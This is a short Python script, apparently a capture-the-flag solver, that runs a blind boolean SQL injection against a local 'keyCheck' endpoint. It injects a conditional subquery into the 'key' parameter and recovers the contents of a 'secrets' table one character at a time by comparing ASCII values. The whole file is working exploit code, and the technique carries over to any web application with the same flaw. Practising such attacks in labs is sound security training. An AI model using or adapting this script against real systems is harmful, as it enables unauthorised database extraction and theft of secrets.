#! python3
import string

import requests


def exploit():

    url = "http://localhost:5002/keyCheck"
    chars = string.printable
    params = {}
    flag = ""

    for i in range(1024):  # 1024 is a tentative number of flag length
        for c in chars:
            params["key"] = (
                f"notusedkey' or \
                1=if((select ascii(substr(data, {i+1}, 1)) from secrets)\
                ={ord(c)}, 1, 0)#"
            )
            r = requests.get(url, params)

            if r.text != "used":
                if c == chars[-1]:
                    return
                continue

            flag += c
            print(flag)
            break


def main():
    exploit()


if __name__ == "__main__":
    main()
